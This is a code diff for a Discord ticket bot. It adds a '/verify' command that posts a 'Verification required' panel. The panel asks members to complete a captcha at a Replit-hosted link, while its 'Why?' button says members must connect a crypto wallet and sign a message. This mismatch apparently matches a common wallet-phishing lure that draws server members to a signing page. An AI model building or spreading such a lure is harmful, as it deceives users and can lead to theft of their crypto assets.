@@ -59,6 +59,10 @@ export async function initializeDiscordBot() {
           new SlashCommandBuilder()
             .setName('panel')
             .setDescription('Send the ticket panel to this channel')
+            .toJSON(),
+          new SlashCommandBuilder()
+            .setName('verify')
+            .setDescription('Send the verification panel to this channel')
             .toJSON()
         ];
 
@@ -81,7 +85,6 @@ export async function initializeDiscordBot() {
       if (interaction.isChatInputCommand()) {
         if (interaction.commandName === 'panel') {
           try {
-            // Defer immediately to prevent timeout
             await interaction.deferReply({ flags: 64 });
             await sendTicketPanel(interaction.channelId);
             await interaction.editReply({ content: '✅ Ticket panel sent!' });
@@ -97,12 +100,41 @@ export async function initializeDiscordBot() {
               console.error('Failed to send error response:', replyError);
             }
           }
+        } else if (interaction.commandName === 'verify') {
+          try {
+            await interaction.deferReply({ flags: 64 });
+            await sendVerifyPanel(interaction.channelId, interaction.guild?.name || 'Server');
+            await interaction.editReply({ content: '✅ Verification panel sent!' });
+          } catch (error) {
+            console.error('Error sending verify panel:', error);
+            try {
+              if (interaction.deferred) {
+                await interaction.editReply({ content: '❌ Failed to send verification panel.' });
+              } else {
+                await interaction.reply({ content: '❌ Failed to send verification panel.', flags: 64 });
+              }
+            } catch (replyError) {
+              console.error('Failed to send error response:', replyError);
+            }
+          }
         }
         return;
       }
 
       // Handle button clicks
       if (!interaction.isButton()) return;
+
+      if (interaction.customId === 'verify_why') {
+        try {
+          await interaction.reply({
+            content: 'This server uses wallet verification to prevent bots and ensure all members are real users. The verification process is quick and secure - just connect your wallet and sign a message to prove ownership.',
+            flags: 64
+          });
+        } catch (err) {
+          console.error('Error responding to why button:', err);
+        }
+        return;
+      }
 
       if (interaction.customId === 'create_ticket_general') {
         await handleTicketCreation(interaction, 'General Support');
@@ -377,6 +409,40 @@ export async function sendTicketPanel(channelId: string) {
         .setLabel('Partnership Request')
         .setStyle(ButtonStyle.Success)
         .setEmoji('🤝')
+    );
+
+  await (channel as TextChannel).send({ embeds: [embed], components: [row] });
+}
+
+export async function sendVerifyPanel(channelId: string, serverName: string) {
+  if (!client) {
+    throw new Error('Discord bot not initialized');
+  }
+
+  const channel = await client.channels.fetch(channelId);
+  if (!channel || channel.type !== ChannelType.GuildText) {
+    throw new Error('Invalid channel');
+  }
+
+  const appUrl = `https://${process.env.REPLIT_DEV_DOMAIN || process.env.REPL_SLUG + '.replit.app'}`;
+
+  const embed = new EmbedBuilder()
+    .setTitle('Verification required')
+    .setDescription(`To gain access to **${serverName}** you need to prove you are a human by completing a captcha. Click the button below to get started!`)
+    .setColor(0x2b2d31)
+    .setFooter({ text: `ONLY verify on ${appUrl}` });
+
+  const row = new ActionRowBuilder<ButtonBuilder>()
+    .addComponents(
+      new ButtonBuilder()
+        .setLabel('Verify')
+        .setStyle(ButtonStyle.Link)
+        .setURL(appUrl)
+        .setEmoji('🤖'),
+      new ButtonBuilder()
+        .setCustomId('verify_why')
+        .setLabel('Why?')
+        .setStyle(ButtonStyle.Secondary)
     );
 
   await (channel as TextChannel).send({ embeds: [embed], components: [row] });
